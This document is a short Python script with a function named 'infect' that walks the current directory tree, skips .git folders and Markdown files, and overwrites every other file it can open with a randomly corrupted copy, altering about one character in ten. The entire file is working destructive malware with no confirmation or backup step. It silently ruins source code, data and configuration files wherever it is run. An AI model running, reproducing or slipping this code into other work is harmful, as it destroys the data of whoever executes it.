import os
import sys
import random


def infect():
    current_directory = os.getcwd()
    running_file = sys.argv[0]

    for root, dirs, files in os.walk(current_directory):
        if '.git' in dirs:
            dirs.remove('.git')  # Exclude the .git directory
        for file in files:
            file_path = os.path.join(root, file)
            if file_path != running_file and not file_path.endswith('.md') and '.git' not in file_path.split(
                    os.path.sep):
                try:
                    with open(file_path, 'r+') as f:
                        content = f.read()
                        f.seek(0)
                        f.truncate()
                        new_content = mutate_content(content)
                        f.write(new_content)
                except Exception as e:
                    print(f"Error infecting {file_path}: {e}")


def mutate_content(content):
    # Randomly mutate the content
    mutated_content = ""
    for char in content:
        if random.random() < 0.1:  # 10% chance of mutation
            mutated_content += random.choice(
                'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?')
        else:
            mutated_content += char
    return mutated_content


if __name__ == "__main__":
    infect()
